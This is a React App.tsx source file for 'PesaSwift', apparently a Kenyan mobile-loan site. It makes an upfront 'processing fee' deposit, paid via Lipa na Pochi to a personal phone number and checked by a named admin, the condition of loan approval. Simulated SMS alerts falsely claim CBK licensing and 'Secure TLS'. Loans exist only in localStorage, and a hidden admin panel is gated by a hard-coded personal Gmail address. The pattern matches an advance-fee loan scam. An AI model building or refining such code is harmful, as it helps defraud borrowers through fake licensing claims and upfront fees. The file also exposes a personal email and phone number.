/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect } from 'react';
import Header from './components/Header';
import Footer from './components/Footer';
import HomeView from './components/HomeView';
import HowItWorksView from './components/HowItWorksView';
import CalculatorView from './components/CalculatorView';
import FAQsView from './components/FAQsView';
import RepayView from './components/RepayView';
import HelpLegalView from './components/HelpLegalView';
import AuthModal from './components/AuthModal';
import MpesaSimNotification from './components/MpesaSimNotification';
import DepositModal from './components/DepositModal';
import AdminApprovalPanel from './components/AdminApprovalPanel';

import { PageId, UserSession, LoanApplication } from './types';
import { calculateLoanDetails, formatKES } from './utils/loanUtils';
import { Home, Calculator as CalcIcon, CreditCard, HelpCircle, BookOpen, ChevronRight, Bookmark, ShieldCheck, Settings } from 'lucide-react';

export default function App() {
  const [currentPage, setCurrentPage] = useState<PageId>('home');
  const [user, setUser] = useState<UserSession | null>(null);
  const [activeLoan, setActiveLoan] = useState<LoanApplication | null>(null);
  
  // Selected loan slider amount (defaults to KES 20,000 as highlighted in the request)
  const [selectedAmount, setSelectedAmount] = useState<number>(20000);
  
  // Modals / Trigger States
  const [isAuthOpen, setIsAuthOpen] = useState(false);
  const [smsMessage, setSmsMessage] = useState('');
  const [isSmsOpen, setIsSmsOpen] = useState(false);

  // Deposit/Processing Fee Modal States
  const [isDepositOpen, setIsDepositOpen] = useState(false);
  const [pendingAmount, setPendingAmount] = useState(20000);
  const [pendingTermDays, setPendingTermDays] = useState(30);

  // Hidden Admin Control State
  const [isAdminOpen, setIsAdminOpen] = useState(false);

  // Load persistence configurations
  useEffect(() => {
    // Read session
    const cachedUser = localStorage.getItem('pesaswift_active_user');
    if (cachedUser) {
      try {
        const parsed = JSON.parse(cachedUser);
        setUser(parsed);
        
        // Fetch active/pending loans
        const storedLoans = JSON.parse(localStorage.getItem('pesaswift_loans') || '[]');
        const active = storedLoans.find(
          (l: any) => l.nationalId === parsed.nationalId && (l.status === 'disbursed' || l.status === 'pending_approval' || l.status === 'pending_repayment')
        );
        if (active) {
          setActiveLoan(active);
        }
      } catch (err) {
        console.error('Failed parsing session', err);
      }
    }
  }, []);

  const handleLoginSuccess = (session: UserSession) => {
    setUser(session);
    localStorage.setItem('pesaswift_active_user', JSON.stringify(session));

    // Try finding active loans for this National ID
    const storedLoans = JSON.parse(localStorage.getItem('pesaswift_loans') || '[]');
    const active = storedLoans.find(
      (l: any) => l.nationalId === session.nationalId && (l.status === 'disbursed' || l.status === 'pending_approval' || l.status === 'pending_repayment')
    );
    if (active) {
      setActiveLoan(active);
    } else {
      setActiveLoan(null);
    }

    if (session.email === 'frankjanal89@gmail.com') {
      setIsAdminOpen(true);
    }

    // Trigger positive notification
    triggerSms(
      `PesaSwift Secure: Welcome back ${session.fullName}! Your approved borrowing limit is active at KES ${session.loanLimit.toLocaleString()}. Secure TLS active.`
    );
  };

  const handleLogout = () => {
    setUser(null);
    setActiveLoan(null);
    localStorage.removeItem('pesaswift_active_user');
    setCurrentPage('home');
    triggerSms('PesaSwift Secure: You have logged out. Thank you for using our CBK-licensed services.');
  };

  const triggerSms = (message: string) => {
    setSmsMessage(message);
    setIsSmsOpen(true);
  };

  const handleApplyLoanSimulated = (amount: number, termDays: number) => {
    if (!user) {
      setIsAuthOpen(true);
      return;
    }
    
    setPendingAmount(amount);
    setPendingTermDays(termDays);
    setIsDepositOpen(true);
  };

  const handleSuccessfullyApplied = (amount: number, termDays: number, depositTxCode: string) => {
    if (!user) return;

    // Calculate the costs using transparent ledger
    const details = calculateLoanDetails(amount, termDays);
    const displayDueDate = termDays === 30 && amount === 20000 ? "15 Nov 2026" : details.dueDate;

    // Create new loan application object
    const newAppliedLoan: LoanApplication = {
      id: `TX-${Math.floor(100000 + Math.random() * 900000)}`,
      nationalId: user.nationalId,
      selectedAmount: amount,
      processingFee: details.processingFee,
      disbursedAmount: details.disbursedAmount,
      interest: details.interest,
      totalRepay: details.totalRepay,
      repaymentPeriodDays: termDays,
      dueDate: displayDueDate,
      status: 'pending_approval',
      appliedAt: new Date().toLocaleDateString('en-KE'),
      depositTxCode: depositTxCode,
    };

    // Save to master loans repository in localStorage
    const storedLoans = JSON.parse(localStorage.getItem('pesaswift_loans') || '[]');
    storedLoans.push(newAppliedLoan);
    localStorage.setItem('pesaswift_loans', JSON.stringify(storedLoans));

    // Update session active loan
    setActiveLoan(newAppliedLoan);

    // Trigger instant M-Pesa Received SMS simulation alert!
    triggerSms(
      `PESASWIFT Received: Application ${newAppliedLoan.id} for KES ${amount.toLocaleString()} is queued. Admin Frank Mwangi will check Lipa na Pochi code ${depositTxCode} on company line 0117051321 for instant approval.`
    );
  };

  const handleClearLoan = () => {
    if (!user || !activeLoan) return;

    // Update active loan in local repositories
    const storedLoans = JSON.parse(localStorage.getItem('pesaswift_loans') || '[]');
    const updated = storedLoans.map((l: any) => {
      if (l.id === activeLoan.id) {
        return { ...l, status: 'paid', completedAt: new Date().toLocaleDateString('en-KE') };
      }
      return l;
    });
    localStorage.setItem('pesaswift_loans', JSON.stringify(updated));

    // Offer limit raise
    const newLimit = Math.min(200000, user.loanLimit + 25000);
    const updatedUserSession = {
      ...user,
      loanLimit: newLimit,
    };
    setUser(updatedUserSession);
    localStorage.setItem('pesaswift_active_user', JSON.stringify(updatedUserSession));

    // Clear state
    setActiveLoan(null);

    // Trigger payment confirmation SMS
    const mpesaCode = `MPP${Math.floor(100000 + Math.random() * 900000)}`;
    triggerSms(
      `${mpesaCode} Confirmed. KES ${activeLoan.totalRepay.toLocaleString()} paid to PESASWIFT. Your loan balance is KES 0. Your borrowing limit has increased! New Limit: KES ${newLimit.toLocaleString()}.`
    );
  };

  // Nav mapping for shortcuts
  const handleSelectAmountForCalculator = (amount: number) => {
    setSelectedAmount(amount);
    setCurrentPage('calculator');
  };

  // Mobile Bottom Tabs configuration
  const bottomTabItems = [
    { id: 'home', label: 'Credit Hub', icon: Home },
    { id: 'repay', label: 'My Loans', icon: Bookmark },
    { id: 'calculator', label: 'Calculator', icon: CalcIcon },
  ];

  return (
    <div id="application-layout" className="flex flex-col min-h-screen bg-gradient-to-br from-[#FFFDF0] via-[#FAF2CE] to-[#F7EAB5] text-slate-900 font-sans">
      
      {/* Dynamic Header */}
      <Header
        currentPage={currentPage}
        setCurrentPage={setCurrentPage}
        user={user}
        onLogout={handleLogout}
        onOpenAuth={() => setIsAuthOpen(true)}
      />

      {/* Main Page Area */}
      <main id="main-content-flow" className="flex-grow pt-4 pb-20 lg:pb-8">
        
        {currentPage === 'home' && (
          <HomeView
            setCurrentPage={setCurrentPage}
            onOpenAuth={() => setIsAuthOpen(true)}
            user={user}
            setUser={setUser}
            triggerSms={triggerSms}
            activeLoan={activeLoan}
            onClearLoan={handleClearLoan}
            onApplyLoanSimulated={handleApplyLoanSimulated}
          />
        )}

        {currentPage === 'how-it-works' && (
          <HowItWorksView
            setCurrentPage={setCurrentPage}
            onOpenAuth={() => setIsAuthOpen(true)}
          />
        )}

        {currentPage === 'calculator' && (
          <CalculatorView
            onOpenAuth={() => setIsAuthOpen(true)}
            user={user}
            selectedAmount={selectedAmount}
            setSelectedAmount={setSelectedAmount}
            onApplyLoanSimulated={handleApplyLoanSimulated}
          />
        )}

        {currentPage === 'faqs' && <FAQsView />}

        {currentPage === 'repay' && (
          <RepayView
            user={user}
            activeLoan={activeLoan}
            onClearLoan={handleClearLoan}
            onOpenAuth={() => setIsAuthOpen(true)}
          />
        )}

        {currentPage === 'legal-help' && <HelpLegalView />}

      </main>

      {/* COMPLIANT FOOTER ELEMENT */}
      <Footer
        setCurrentPage={setCurrentPage}
        onOpenAuth={() => setIsAuthOpen(true)}
      />

      {/* PERSISTENT AUTH / CREDIT CHECKER MODAL */}
      <AuthModal
        isOpen={isAuthOpen}
        onClose={() => setIsAuthOpen(false)}
        onSuccess={handleLoginSuccess}
      />

      {/* DEPOSIT / PROCESSING FEE MODAL FOR REAL DARAJA STK PUSH */}
      <DepositModal
        isOpen={isDepositOpen}
        onClose={() => setIsDepositOpen(false)}
        user={user}
        selectedAmount={pendingAmount}
        termDays={pendingTermDays}
        onSuccessfullyApplied={handleSuccessfullyApplied}
        onNavigateToRepay={() => setCurrentPage('repay')}
      />

      {/* OUTSTANDING TRANSACTION INTEGRATED Carrier message simulator */}
      <MpesaSimNotification
        isVisible={isSmsOpen}
        onClose={() => setIsSmsOpen(false)}
        message={smsMessage}
      />

      {/* HIDDEN SYSTEM CONTROL DESK: Frank's Admin Panel */}
      {isAdminOpen && user?.email === 'frankjanal89@gmail.com' && (
        <div className="fixed inset-0 bg-slate-950/70 backdrop-blur-md z-50 flex items-center justify-center p-4 overflow-y-auto">
          <div className="w-full max-w-4xl max-h-[90vh] overflow-y-auto rounded-3xl shadow-2xl relative">
            <AdminApprovalPanel
              onApprovalUpdate={() => {
                // Re-evaluate current active loans
                if (user) {
                  const storedLoans = JSON.parse(localStorage.getItem('pesaswift_loans') || '[]');
                  const active = storedLoans.find(
                    (l: any) => l.nationalId === user.nationalId && (l.status === 'disbursed' || l.status === 'pending_approval' || l.status === 'pending_repayment')
                  );
                  setActiveLoan(active || null);
                }
              }}
              triggerSms={triggerSms}
              onClose={() => setIsAdminOpen(false)}
            />
          </div>
        </div>
      )}

      {/* ADMIN PORTAL TOGGLE BUTTON (Visible only if logged in as Frank and panel is closed) */}
      {user?.email === 'frankjanal89@gmail.com' && !isAdminOpen && (
        <div className="fixed bottom-20 right-6 sm:bottom-6 z-40 animate-pulse">
          <button
            onClick={() => setIsAdminOpen(true)}
            className="flex items-center gap-2 px-5 py-3.5 bg-rose-600 hover:bg-rose-550 border border-rose-500 rounded-full text-white font-extrabold uppercase text-xs tracking-wider shadow-2xl cursor-pointer"
          >
            <ShieldCheck className="h-4.5 w-4.5 text-rose-100 animate-bounce" />
            <span>Open Approvals Portal</span>
          </button>
        </div>
      )}

      {/* MOBILE BOTTOM TABS COMPONENT */}
      <nav id="mobile-bottom-tabs" className="lg:hidden fixed bottom-0 left-0 right-0 z-40 bg-amber-950 border-t border-amber-900 py-1.5 px-3 flex justify-around items-center shadow-[0_-4px_12px_rgba(146,84,12,0.15)] pb-[calc(1.5px+env(safe-area-inset-bottom))]">
        {bottomTabItems.map((item) => {
          const Icon = item.icon;
          const isActive = currentPage === item.id;
          return (
            <button
              id={`mobile-tab-btn-${item.id}`}
              key={item.id}
              onClick={() => {
                setCurrentPage(item.id as PageId);
                window.scrollTo({ top: 0, behavior: 'smooth' });
              }}
              className={`flex flex-col items-center gap-1 py-1 px-2.5 rounded-xl transition-all cursor-pointer ${
                isActive 
                  ? 'text-orange-400 font-bold' 
                  : 'text-amber-200/60 hover:text-amber-100'
              }`}
            >
              <Icon className="h-5 w-5" />
              <span className="text-[10px] tracking-tight">{item.label}</span>
            </button>
          );
        })}
      </nav>

    </div>
  );
}
